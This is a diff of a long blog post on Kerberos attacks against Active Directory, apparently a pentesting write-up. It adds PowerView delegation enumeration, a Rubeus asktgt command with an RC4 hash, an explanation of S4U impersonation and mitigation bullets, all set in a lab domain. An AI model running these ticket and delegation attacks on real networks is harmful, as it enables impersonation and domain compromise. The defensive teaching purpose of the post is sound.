@@ -31,6 +31,14 @@ Below is a list of the outlined attacks & topics.
 
 But First Let's talk about Kerberos and how it **really **works.
 
+
+
+
+
+****
+
+
+
 # [](#header-1)Kerberos Fundamentals 
 
 
@@ -76,9 +84,16 @@ Now I could ramble on now about the complete process of Requesting a **TGT**, **
 
 **I was planning on explaining here the Kerberos Process from requesting a TGT & TGS Ticket at a high level and then I found this pic, so I will let it do the talking.**
 
+
+
+
+
 ![a simple Kerberos authentication diagram](https://www.varonis.com/blog/wp-content/uploads/2018/07/Kerberos-Graphics-1-v2-787x790.jpg)
 
+
+
 ****
+
 
 
 #  [](#header-1)Kerberoast
@@ -316,7 +331,7 @@ However as this is normal operation you will get ALOT ALOT of `Event 4769` & `Ev
 
 
 
-
+****
 
 
 
@@ -531,7 +546,7 @@ However I would advise if you do need to disable this for some reason that the p
 
 
 
-
+****
 
 
 
@@ -664,6 +679,8 @@ Impacket v0.9.20 - Copyright 2018 SecureAuth Corporation
 Similar to Rubeus it will also request a `TGT` and save it in `.ccache` format which is Linux's Kerberos ticket format which you can later inject to gain access to network resources etc. 
 
 
+
+****
 
 
 
@@ -1001,6 +1018,8 @@ Set `Account is Sensitive and Cannot be Delegated` as this will prevent an attac
 
 
 
+****
+
 
 
 # [](#header-1) Golden Ticket
@@ -1213,10 +1232,6 @@ We can then pass the -K switch through with any other Impacket scripts and it wi
 
 
 
-### [](#header-3)Golden Tickets + SID History 
-
-*talk about sid filtering*
-
 
 
 ### [](#header-3)Mitigation / Defending Golden Tickets
@@ -1227,7 +1242,7 @@ Golden Tickets are really hard to monitor for as effectively they are just legit
 
 
 
-
+****
 
 
 
@@ -1388,6 +1403,8 @@ It is also advised to ensure that Kerberos tickets are set to expire within 10 h
 
 
 
+****
+
 # [](#header-1)Unconstrained Delegation 
 
 *Unconstrained Delegation (aka) **TGT Forwarding (TrustedForDelegation)***
@@ -1488,7 +1505,7 @@ And that's really it... **Unconstrained Delegation** is bad. I highly recommend 
 
 
 
-
+****
 
 
 
@@ -1609,6 +1626,29 @@ PS C:\Users\m0chan> Get-DomainComputer -TrustedToAuth -Properties distinguishedn
 
 
 
+Another Example
+
+```powershell
+PS C:\Users\m0chan> Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
+ldap/DC.m0chanAD.local/m0chanAD.local
+ldap/PRIMARY
+ldap/DC.m0chanAD.local/
+ldap/DC/m0chanAD
+ldap/DC.m0chanAD.local/DomainDnsZones.m0chanAD.local
+ldap/DC.m0chanAD.local/ForestDnsZones.m0chanAD.local
+ldap/DC.m0chanAD.local
+```
+
+
+
+Bloodhound 2.0
+
+I have sadly not tested Bloodhound 2.0 yet but I am aware that is supports **Constrained** & **Unconstrained Delegation** enumeration. 
+
+*https://blog.cptjesus.com/posts/bloodhound20*
+
+
+
 ### [](#header-3)Exploiting
 
 
@@ -1663,17 +1703,21 @@ This will dump any relevant cached `TGS` ticket's stored on the box which we can
 
 
 
-Relatively simple :) 
+Relatively simple :)
+
+ 
 
 **Example 2 - Plaintext Password too Service Access**
 
 Shoutout to @harmj0y & @gentilkiwi for this example. Really cool imo. 
 
-Basically this attack works around the basis that you have compromised a plaintext password of a user account that is trusted for **Constrained Delegation** and/or a NTLM hash. Basically you can use the pass the users password/NTLM hash, request a `TGT` & execute a request for a `TGS` ticket and of course access the respective `SPN` / `Service`
+Basically this attack works around the basis that you have compromised a plaintext password of a user account that is trusted for **Constrained Delegation** and/or a RC4 Hash/AES Key. Basically you can use the pass the users password/NTLM hash, request a `TGT` & execute a request for a `TGS` ticket and of course access the respective `SPN` / `Service`
 
 
 
 **Request a TGT**
+
+*https://github.com/GhostPack/Rubeus#asktgt*
 
 ```powershell
 PS C:\Users\m0chan> .\Rubeus.exe asktgt /user:m0chan /domain:m0chanAD.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6
@@ -1741,3 +1785,48 @@ PS C:\Users\m0chan> .\Rubeus.exe s4u /ticket:C:\Temp\Tickets\aidanldap.kirbi /im
 [+] Ticket successfully imported!
 ```
 
+
+
+Now we don't really have to issue a `s4u` request if we own the account, we could simply request a `TGS` ticket but of course we would be limited to the context of the pwned account. The `S4U` request is simply if we want to abuse the account trusted for **Constrained Delegation** but impersonate any users context to access said service. 
+
+
+
+### [](#header-3)Mitigation / Defending Constrained Delegation 
+
+
+
+- Also if a user is part of the **Protected-Users Group** he/she will will not be allowed for delegation
+- Configure all Privileged or Sensitive Accounts with `Account is Sensitive and Cannot be Delegated.
+- Use Strong-Strong Passwords for Accounts Trusted for Delegation
+
+
+
+
+
+# [](#header-1) Conclusion
+
+
+
+I believe in this article I have clearly demonstrated that while Kerberos is a really cool protocol and probably the best internal authentication protocol it has a large attack-surface for adversary's. All IT Professionals should be aware of this attack-surface so they can configure there environments to meet the mitigation standards otherwise if poorly configured it will not take long for a attacker to compromise the network as a whole very very quickly. 
+
+
+
+This has been a *really really* long article and when I started this I did not imagine we would end up at 10k words but it's been a great learning experience. I want to give a special mention to the below people as without them I would not have been able to learn so much in the past week writing this. 
+
+
+
+@harmj0y - https://blog.harmj0y.net/
+
+@ADSecurity / Sean Metcalf - https://adsecurity.org/
+
+@CyberArk - https://www.cyberark.com/threat-research-blog/weakness-within-kerberos-delegation/
+
+
+
+If anyone has any questions regarding anything covered above feel free to hit me up on Twitter @m0chan98 and I will be more than happy to provide some guidance/information.
+
+And most important thank you for reading!!
+
+
+
+~m0chan
